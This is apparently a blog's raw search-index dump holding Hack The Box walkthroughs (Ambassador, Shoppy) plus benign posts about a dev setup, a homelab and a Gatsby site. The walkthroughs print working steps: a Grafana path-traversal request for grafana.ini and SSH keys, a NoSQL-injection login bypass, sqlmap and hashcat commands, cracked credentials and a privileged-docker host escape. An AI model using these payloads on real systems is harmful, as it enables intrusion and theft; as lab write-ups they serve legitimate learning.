10:03:19 GMT Connection: close root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network❌100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve❌101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync❌102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus❌103:106::/nonexistent:/usr/sbin/nologin syslog❌104:110::/home/syslog:/usr/sbin/nologin _apt❌105:65534::/nonexistent:/usr/sbin/nologin tss❌106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd❌107:112::/run/uuidd:/usr/sbin/nologin tcpdump❌108:113::/nonexistent:/usr/sbin/nologin landscape❌109:115::/var/lib/landscape:/usr/sbin/nologin pollinate❌110:1::/var/cache/pollinate:/bin/false usbmux❌111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd❌112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump❌999:999:systemd Core Dumper:/:/usr/sbin/nologin developer❌1000:1000:developer:/home/developer:/bin/bash lxd❌998💯:/var/snap/lxd/common/lxd:/bin/false grafana❌113:118::/usr/share/grafana:/bin/false mysql❌114:119:MySQL Server,,,:/nonexistent:/bin/false consul❌997:997::/home/consul:/bin/false Let’s filter out users without a valid shell, which may be useful for SSH access later: $grep -ivE \"/bin/false|/usr/sbin/nologin\" passwd.txt root❌0:0:root:/root:/bin/bash sync❌4:65534:sync:/bin:/bin/sync developer❌1000:1000:developer:/home/developer:/bin/bash consul❌997:997::/home/con Reading through Grafana documentation, seeing where the config file is usually stored, and running a GET /public/plugins/alertGroups/../../../../../../../../etc/grafana/grafana.ini provides us the admin password. Fun times: # default admin password, can be changed before first start of grafana, or in profile settings admin_password = messageInABottle685427 And we can login to the Grafana web interface successfully: I also tried other opportunistic files in the above path traversal, notably /home/con/.ssh/id_rsa and /home/developer/.ssh/id_rsa, but rece","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:3:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Privilege Escalation I won’t write every gory detail here, but suffice to say, I tried low hanging fruit: sudo – can’t run sudo as developer user no unusual processes running no setuid binaries I can execute nothing in my home directory nothing unusual in my printenv there’s a path /development-machine-documentation/, which contains the static hugo site we found earlier – it contains a deploy.sh which copies files into /var/www/html. Nothing stood out here as helpful to gaining root The most obvious thing running as root that looked interesting was the consul agent: developer@ambassador:/etc/consul.d/config.d$ ps aux | grep consul root 1070 0.4 3.8 795828 76960 ? Ssl 05:26 1:28 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl Unfortunately, I didn’t have permission to read the config directory or file passed as params to the process. According to documentation, the agent should run on TCP 8500 and 8501 for HTTP and HTTPS respectively Required Ports | Consul | HashiCorp Developer. So checking netstat: developer@ambassador:/etc/consul.d/config.d$ netstat -tupln (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:8301 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8302 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8500 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8600 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:33060 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8300 0.0.0.0:* LISTEN - With no idea how to interact with it, I confirmed I could hit the HTTP server locally from the machine, but not from my own machine – so I assumed it was firewalled but accessible locally: developer@ambassador:/etc/consul.d/config.d$ curl -v \"http://127.0.0.1:8500/v1/agent/checks\" * Trying 127.0.0.1:8500... * TCP_NODELAY set * Connected to 127.0.0.1 (127.0.0.1) port 8500 (#0) \u003e GET /v1/agent/checks HTTP/1.1 \u003e Host: 127.0.0.1:8500 \u003e User-Agent: curl/7.68.0 \u003e Accept: */* \u003e * Mark bundle as not supporting multiuse \u003c HTTP/1.1 200 OK \u003c Content-Type: application/json \u003c Vary: Accept-Encoding \u003c X-Consul-Default-Acl-Policy: deny \u003c Date: Thu, 26 Jan 2023 11:19:46 GMT \u003c Content-Length: 2 \u003c * Connection #0 to host 127.0.0.1 left intact I tried to check the agent version, but get a permission denied: developer@ambassador:~$ curl --silent http://localhost:8500/v1/agent/self Permission denied: token with AccessorID '00000000-0000-0000-0000-000000000002' lacks permission 'agent:read' on \"ambassador\"developer@ambassador:~$ This led me to wonder if i could create my own token to pass to the API. Unfortunately I lacked acl:write permission. I tried a few different JSON payloads in curl against /v1/agent/check/register, including “script”, with a reverse shell but nothing seemed to work. I also tried consul acl token list thinking perhaps the developer user had more access to consul than a HTTP request, but didn’t have acl:read either. My access was very restricted :( Searching the file system for consul, I found a bash script in a directory for an app that looks familiar (whackywidget): developer@ambassador:/opt$ find / -name '*consul*' 2\u003e /dev/null ..snip.. /opt/consul /opt/my-app/whackywidget/put-config-in-consul.sh /usr/lib/systemd/system/consul.service /usr/bin/consul developer@ambassador:/opt$ cat /opt/my-app/whackywidget/put-config-in-consul.sh # We use Consul for application config in production, this script will help set the correct values for the app # Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD So CONSUL_HTTP_TOKEN needs to be set, and searching the file system yielded nothing. I noticed in /opt/my-app/ a .git directory. Running a git log -p to show the commit diffs ","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:4:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Conclusion The most difficult part for this challenge was the privilege escalation – luckily consul seemed like the first (and only?) obvious process running as root that could be exploitable – so it was the clear first choice for investigating privesc. Uncovering the bash script was easy, but I stumbled a little before finding the git logs to get the token I could use with the API. After this, registering a “service” to give me a reverse shell was quite easy. A fun VM, but perhaps easier than I expected for Medium difficulty. I’m interested to see how challenging the next one is. I had not thought to find and check the logs of github repositories on compromised machines before, so this has been added to my arsenal of things to look out for and enumerate. The temptation often is to break out LinPEAS and just scan, but getting a ‘feel’ for a server – what does it appear to be used for? what story does it tell? and what kind of things should I be looking for? – and enumerating on a case by case basis seems to be a nicer way to narrow down the possibilities without being overwhelmed by all the potentials of enumerating many things at once. ","date":"2023-01-29","objectID":"/2023-01-29-ambassador-htb/:5:0","tags":["pentesting","security","penetration testing","ctf","consul","grafana"],"title":"Ambassador HTB Walkthrough","uri":"/2023-01-29-ambassador-htb/"},{"categories":null,"content":"Intro I have been spending some time over the holiday break working on CTF challenges - including both Hack The Box, PicoCTF and learning a little binary exploitation. Taking notes for my own review \u0026 learning seemed like a good opportunity to post up CTF walkthroughs and get back into the habit of blogging again. So, here is the first of hopefully many walkthroughs I will post up as time permits, and when machines on Hack The Box are retired. ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:1:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Enumeration As always, we connect to the HTB VPN using OpenVPN, and join the machine to be given an IP address. All work is done from a Parrot OS VirtualBox VM. Firstly, a quick nmap scan: $nmap -sC -sV -o nmap/initial 10.10.11.180 Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-25 15:38 AEDT Nmap scan report for 10.10.11.180 Host is up (0.020s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb |_http-server-header: nginx/1.23.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect res Browsing to http://10.10.11.180 redirects to http://shoppy.htb, so I added this to my /etc/hosts file. Browsing to http://shoppy.htb gives a landing page with a countdown: Gobuster output using common.txt wordlist: $gobuster dir -u \"http://shoppy.htb\" -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/12/25 15:53:38 Starting gobuster in directory enumeration mode =============================================================== /admin (Status: 302) [Size: 28] [--\u003e /login] /Admin (Status: 302) [Size: 28] [--\u003e /login] /ADMIN (Status: 302) [Size: 28] [--\u003e /login] /assets (Status: 301) [Size: 179] [--\u003e /./] /css (Status: 301) [Size: 173] [--\u003e /css/] /exports (Status: 301) [Size: 181] [--\u003e /exports/] /favicon.ico (Status: 200) [Size: 213054] /fonts (Status: 301) [Size: 177] [--\u003e /fonts/] /images (Status: 301) [Size: 179] [--\u003e /images/] /js (Status: 301) [Size: 171] [--\u003e /js/] /login (Status: 200) [Size: 1074] /Login (Status: 200) [Size: 1074] =============================================================== 2022/12/25 15:53:49 Finished =============================================================== ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:2:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Foothold I attempted to run sqlmap against http://shoppy.htb/login, but kept getting timeout errors: [17:43:29] [CRITICAL] connection timed out to the target URL or proxy. sqlmap is going to retry the request(s) [17:44:59] [CRITICAL] connection timed out to the target URL or proxy I next ran sqlmap through burp suite and checked the intercepted traffic: $sqlmap -u \"http://shoppy.htb/login\" --data \"username=*\u0026password=*\" --proxy \"http://127.0.0.1:8080\" --headers=\"User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0\" At this point, it appeared to my novice eyes as though a WAF (web app firewall) was blocking SQL injection attempts (maybe?) as ’normal’ login attempts result in a 302 redirect, not a 504 gateway timeout. I did notice the timeouts only occur when injecting into user, not password – so I suspected that this was the exploitable input field.. But the above was a modified intercepted request from Firefox with a legitimate user agent string along with other headers – so perhaps not a WAF and something else?.. After a little while of unsuccessful SQL Injection both with SQLMap and y, I back tracked a little to look at other injection techniques and started reading NoSQL injection - HackTricks I then tried the following to see if I was dealing with some document database that could be injected into: POST /login HTTP/1.1 Content-Length: 42 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0 Host: shoppy.htb Accept: */* Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=utf-8 Connection: close username=admin' || 1==1%00\u0026password=foobar The initial example of username=admin' || 1==1//\u0026password=foobar gave a 504, but the above worked and gave the following response!: HTTP/1.1 302 Found Server: nginx/1.23.1 Date: Sun, 25 Dec 2022 07:38:44 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 28 Connection: close Location: /admin Vary: Accept Set-Cookie: connect.sid=s%3Aw1vzR-3zSPV98eF-hiBqdfT8SFB4-Omf.s03gQG0EK%2F4m8xUI8cB0EP5xTTqOk7SEFv9W16yAxJY; Path=/; HttpOnly Found. Redirecting to /admin After the redirect I ended up at /admin: The page looks fairly static, apart from the Search for users button which does a GET http://shoppy.htb/admin/search-users . If i inject into this with ' || 1==1// , I get two users in the download link that shows - http://shoppy.htb/exports/export-search.json: [ {\"_id\":\"62db0e93d6d6a999a66ee67a\",\"username\":\"admin\",\"password\":\"23c6877d9e2b564ef8b32c3a23de27b2\"}, {\"_id\":\"62db0e93d6d6a999a66ee67b\",\"username\":\"josh\",\"password\":\"6ebcea65320589ca4f2f1ce039975995\"} ] After running hashcat against a file containing both MD5 sums: $hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt hashcat (v6.1.1) starting... $hashcat --show hashes.txt 6ebcea65320589ca4f2f1ce039975995:remembermethisway I was unable to SSH into the machine with josh/remembermethisway, and here I got a little stuck.. I reviewed the server, looking for other clues but couldn’t find much. I decided to scan all ports with nmap -sC -sV -oN nmap/all -p- 10.10.11.180, and saw 9093 was an open HTTP server Searching around, it looked like Prometheus go metrics – however there was nothing that appeared particularly useful. I’ll admit that here I ‘cheated’ and checked the HTB discussion thread for this box – and saw people hinting at another subdomain. I noticed when searching for some of the terms in the above prometheus alerts, particularly around playbooks, I saw reference to mattermost: GitHub - mattermost/mattermost-plugin-playbooks: Mattermost Playbooks enable reliable and repeatable processes for your teams using checklists, automation, and retrospectives. With this in mind, I ran a vhost scan in gobuster using SecList DNS lists.. $gobuster vhost -u \"http://shoppy.htb\" -w ~/SecLists/Discovery/DNS/*.txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:3:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"Privilege Escalation Checking sudo access, I can run /home/deploy/password-manager, which was mentioned somewhere in the mattermost chat: jaeger@shoppy:~$ sudo -l Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager Running a `strings /home/deploy/password-manager shows a credentials text file, which I cannot cat myself directly: jaeger@shoppy:~$ strings /home/deploy/password-manager \u003c.. snip ..\u003e Welcome to Josh password manager! Please enter your master password: Access granted! Here is creds ! cat /home/deploy/creds.txt Access denied! This incident will be reported ! jaeger@shoppy:~$ cat /home/deploy/creds.txt cat: /home/deploy/creds.txt: Permission denied jaeger@shoppy:~$ ls -la /home/deploy/creds.txt -rw------- 1 deploy deploy 56 Jul 22 13:15 /home/deploy/creds.txt So I am able to run the password manager, but need the master pass, or to somehow bypass this.. jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: remembermethisway Access denied! This incident will be reported ! In /home/deploy, there is a password-manager.cpp which we cannot read. This is in line with the mattermost chat where Josh mentions creating a password manager in C++. We have access to the compiled binary, so let’s take a copy to play with locally: scp jaeger@shoppy.htb:/home/deploy/password-manager . jaeger@shoppy.htb's password: password-manager 100% 18KB 454.9KB/s 00:00 Taking a look at the decompiled main function in Ghidra, it looks like we call the += operator in order to concatenate and build a string stored in variable local_68, which we compare to local_48 (which is std::cin – i.e. the standard input stream). So, the app expects “Sample” – let’s try that: jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! I can now ssh into the deploy account, and confirm the password manager logic above based on the c++ source: #include \u003ciostream\u003e #include \u003cstring\u003e int main() { std::cout \u003c\u003c \"Welcome to Josh password manager!\" \u003c\u003c std::endl; std::cout \u003c\u003c \"Please enter your master password: \"; std::string password; std::cin \u003e\u003e password; std::string master_password = \"\"; master_password += \"S\"; master_password += \"a\"; master_password += \"m\"; master_password += \"p\"; master_password += \"l\"; master_password += \"e\"; if (password.compare(master_password) == 0) { std::cout \u003c\u003c \"Access granted! Here is creds !\" \u003c\u003c std::endl; system(\"cat /home/deploy/creds.txt\"); return 0; } else { std::cout \u003c\u003c \"Access denied! This incident will be reported !\" \u003c\u003c std::endl; return 1; } } I tried clobbering cat in $PATH to privesc, when logged in as jaeger and entering the password – but remembered sudoers is set so you cannot preserve the environment, and /home/deploy/password-manager only runs as the deploy user anyway. I then remembered in matter most chat, there was mention of the deploy account being used and it would be deploying via docker.. So, let’s see if we can access docker, if there are any images (HTB boxes do not have internet access, so cannot pull down container images from dockerhub), and if we can run a privileged container to try get root on the host. Docker based privilege escalation is new to me, and not something I have experience with – but I was able to consult the always excellent HackTricks - Docker Breakout / Privilege Escalation - HackTricks Luckily, we have access to an alpine image we can use to spin up a privileged container. Inside the container we run nsenter: $ docker images REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest d7d3d98c851f 5 months ago 5.53MB $ docker run -it --rm --pid=host --privileged alpine /bin/sh ","date":"2023-01-14","objectID":"/2023-01-14-shoppy-htb/:4:0","tags":["pentesting","security","penetration testing","ctf","docker","reversing"],"title":"Shoppy HTB Walkthrough","uri":"/2023-01-14-shoppy-htb/"},{"categories":null,"content":"About emdwyer","date":"2022-05-23","objectID":"/about/","tags":null,"title":"About emdwyer","uri":"/about/"},{"categories":null,"content":"Interests Development (Ruby, React, Javascript) Infosec / CyberSecurity - Penetration Testing, CTF challenges Fitness - Cycling, Running, Strength Training Philosophy Qualifications B. Engineering (Software) PRINCE2 Foundation ITIL Foundation ","date":"2022-05-23","objectID":"/about/:0:0","tags":null,"title":"About emdwyer","uri":"/about/"},{"categories":null,"content":" My current setup The last several months have seen me moving around.. A lot (thanks COVID).. But after hunting around for furniture due to a shortage of standing desks, I’ve finalised my setup – and thank god. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:0:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Setup It’s been great to revive my Ultrawide and laptop in a fairly minimalist setup. This is my primary dev machine which, if you see my GitHub, has caused no end of issues with running Linux (#YearOfTheLinuxDesktop) in the 2 years I’ve had it. My setup from the photo above: HP Zbook x360 G5 2-in-1 laptop running Arch. Screenfetch shows my config: LG 34UC99-W monitor Drop Alt keyboard (Halo Clears for now) Logitech MX Master 2S Mouse A beautiful Marble Queen Pothos for good measure My development is all local, baremetal (for now) with vscode and browser usually tiled on the Ultrawide, and an extra terminal on my laptop display for running tests or other things requiring more screen real estate outside of vscode’s terminal. I’ll most definitely elaborate on my setup more in a future post. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:1:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Studies My focus since moving to Melbourne has been a combination of React, Node, Express, GraphQL and MongoDB - a fairly big change from the last several years I’ve spent on mostly back end Ruby development, surrounding test automation frameworks and CI/CD. Let’s keep in mind I’ve been moving to full stack and not looked at anything web since my degree an embarassing number of years ago. Back then, it was raw HTML, CSS and a bit of jQuery.. And maybe some Bootstrap. My memory is hazy - it was a while ago! Let’s just say I’ve had a lot of catching up to do - UI frameworks, CSS-in-JS frameworks, bundlers, various other tooling.. So, how has my journey looked? FreeCodeCamp FullStackOpen Projects! I initially completed all the FreeCodeCamp certificates, but became a little bored of coding in a browser, and was after something a little more comprehensive and ‘real world’. FullStackOpen filled the gap really nicely. While FreeCodeCamp focuses on JavaScript basics, FullStackOpen was a great way to quickly come up to speed with the JavaScript ecosystem, and learn how to set up React projects, some WebPack, Node \u0026 Express backends and some GraphQL. Oh, and writing unit tests for React components (react-testing-library), and cypress for e2e integration tests? Excellent. Redux? Great! Linting? Awesome! I felt the jumping between projects throughout the course contents and exercises to be a little jarring and confusing at times (and not so obvious), but being able to create a full stack application from end to end, and mocking out certain components yet to be developed was a great way to get up to speed and provided a structured approach from both a bird’s-eye and on-the-ground-running view – a perfect balance. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:2:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Projects I’ve now started up a full stack project - exertion - yet another fitness tracker. I’m also seemingly forever revising this Gatsby site, which I started from scratch. Reinventing the wheel is obviously not the best of ideas, however it’s been a great look into using a static site generator, writing React components, creating my own front end from scatch (this is where I struggle most) and a little GraphQL. A part of me feels using a Gatsby starter would have been wise, but it has been enjoyable and educational coding it all from scratch. The caveat, of course, is that I still have much to do - particularly applying UI design principles around alignment, whitespace, typography etc - in order to add further polish to my site. For me, this is not only continuing to evolve my CSS skills, but also bridging the gap between being identifying if a site’s UI design is aesthetically pleasing or not and understanding why and how it looks great, then subsequently what styling is required to achieve this. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:3:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":"Next Steps My next steps are to continue my app, and look at Next.js. The tooling, particularly WebPack, has definitely caused a little friction and not provided the best developer experience. I’ve definitely had some fun with WebPack, setting up Babel, getting Jest to work with Babel, etc - so trying out Next.js and some of its features such as code splitting, server side rendering etc looks like a great path forward. ","date":"2021-03-28","objectID":"/2021-03-28-learning-update/:4:0","tags":["development","study","projects"],"title":"My Current Dev Setup and Activity","uri":"/2021-03-28-learning-update/"},{"categories":null,"content":" Cable management - please don't do this. Ever. After relocating around Melbourne multiple times during 2020 (pandemic - long story) and finally settling into my own place with FTTC, I decided it was time to revive the home lab. Previously back in Newcastle, my homelab comprised of: HP MicroServer Gen 8 (running Proxmox) HP ML10v2 (a playground/sandpit host of sorts - jumping between Hyper-V and Proxmox) HP PS1810-8G managed switch Some really crappy, locked all-in-one router device thing from my ISP (I cannot remember the model) After FTTC NBN was finally connected - a drama in itself (another long story) - and after deliberating on Point 4, I decided it made sense to opt for something a little more prosumer grade. I’ve had a longer term interest in homelab tinkering and InfoSec, on top of Development and DevOps things, and simply wanted to Do Things Right™ My ideal setup is the ability to easily create multiple VLANs (which I’ll cover in a future blog), and multiple SSIDs, tagging each with a specific VLAN. This way, I can keep my untrusted IoT devices on their own VLAN with internet access only, and trusted devices (phones, laptops) on a separate VLAN with more freedom. My existing HP MicroServer and ML10V2 run VLAN trunks across the HP switch, and I can readily assign virtual machines to different VLAN IDs, so doing the same for my SSIDs is ideal – again, I’ll cover specifics of my setup later and why I wanted this flexibility. Enter the first upgrade - The Tin Can - otherwise known as the Ubiquiti FlexHD: I originally looked at the UniFi Dream Machine, but the IDS/IPS capabilities seemed somewhat limited, as did the lack of other advanced features. The Unifi AP variants were also considered, but the form factor seemed more suited to mounting on a wall or roof. Besides, who could turn down a wireless access point that resembles a coke can? Next up, after deciding on pfSense as a router/firewall, mostly to play around with IDS/IPS (Suricata) and other packages, I started looking at appliances. The pfSense reddit seems to indicate Protectli and some other pfSense appliances were actually Qotom, Yanling or Minisys mini PCs as found on AliExpress. A quick search on AliExpress for ‘pfsense’ shows many upon many clones of clones of clones of mini PCs with anywhere from 2-6 Intel NICs. I eventually settled on the Topton, a passively cooled mini PC perfectly suited as a router/firewall: Specs: Intel Core i5 8265U (so includes AES-NI) 6 Intel NICs 128 GB SSD 16GB RAM It’s total overkill, but great value for what I paid (around $540 AUD including shipping) for the specs. At this point, I had decided I would virtualise pfSense and pass through a NIC bridged to the NBN FTTC box, given I needed to run the Unifi Network Controller in a separate virtul machine and wasn’t keen on cloud hosted. I think this was the point where I had decided on 16GB RAM, the maximum available at purchase, and 128 GB SSD – with a spare SATA bay for extra storage if required. I would be running this devices as an edge router/firewall, Unifi Network Controller for managing my FlexHD, and with spare resources for any other network appliances I decide on.. In the next part, I’ll cover my basic strategy around configuration, network segmentation, etc. ","date":"2021-03-24","objectID":"/2021-03-24-rebuilding-homelab/:0:0","tags":["homelab","infosec"],"title":"Rebuilding Homelab - Part 1","uri":"/2021-03-24-rebuilding-homelab/"},{"categories":null,"content":" Here it is in its (relative) infancy! Given the current pandemic unfolding, I decided to complete the following on freeCodeCamp to try and increase my productivity (and employment prospects!) while our city has been in and out of lock down: Responsive Web Design Certification JavaScript Algorithms and Data Structures Certification Front End Libraries Certification What this means is, I decided to redo my site using Gatsby, as it seemed to be the static site generator most aligned with React and JavaScript generally, and I was a little curious about GraphQL. Jekyll was fun for a brief moment, but Gatsby seems more aligned with the skills I’m learning and has a fairly comprehensive plugin system. After initially working my way through the tutorials, I did play with some starter Gatsby projects - and it was at this point I decided to reinvent the wheel a little. I’m normally against this (as any developer should be, to a degree), but given my intention to hopefully work in web development at some point, and not having looked at any web development since my university days, I thought developing my own site starting from a blank slate would be a great way to practice and apply some newly learned skills. As such, this is the first project I’ve applied HTML5, CSS3, JS and React to – and any kind of front end development, particularly responsive design. While I’ve worked several technical roles since graduating, including development, none have focused on web development. What does this mean? Strap in for a bumpy ride – plenty of tweaks and improvements to this site, and likely some further technical posts for things I learn and discover along the way that may help others. Oh, and there will be plenty of opportunity for other posts too. I’m currently somewhat obsessed with Productivity (think Getting Things Done) and trying to use technology to its potential, along with develop good habits and establish routines to try and achieve more (much more). I’m sure there will be many topics I can cover in this space. ","date":"2020-07-13","objectID":"/2020-07-13-building-a-site-in-gatsby/:0:0","tags":["development"],"title":"Building a Site in Gatsby","uri":"/2020-07-13-building-a-site-in-gatsby/"},{"categories":null,"content":"Well, here it is. I thought I should attempt to start some platform to rant and share things on, tech related and whatnot. So - here’s my first blog, which I’ll use to share anything related to Linux, development, maybe some fitness and other miscellaneous subjects. Bear with me, as this site also will also serve as a starting point for (re)learning some web development. For the past few years, I’ve largely concentrated on Ruby, C#, some BASH and other scripting – so I’m picking up web again and I’m very rusty! Along the way, I’m hoping to document anything interesting I find. There have been many moments previously where, beyond a git repository, I’ve thought ‘I should probably take note of this somewhere, and share with others’. So, now I have no excuses! A static site generator seemed like my best option, as it’s trivial to register a domain, and link back to Github Pages. I decided to go with Jekyll for the simple reason that it seems simple and straightforward to start with, and I’m already familiar with Ruby. However, I am starting to (re)learn HTML, CSS, Javascript and hoping to pick up Node and React. Eventually, I’d like to try out another static site generator, such as Gatesby. As you have undoubtedly noticed, front end development is not my forte. My background has mostly been backend (some very minor front end web, and Windows Forms applications), so I will be attempting to place a degree of emphasis on this over the coming months, and learning to make things pretty. Obviously I have a long way to go! ","date":"2020-03-30","objectID":"/2020-03-20-first/:0:0","tags":["development"],"title":"First post","uri":"/2020-03-20-first/"}]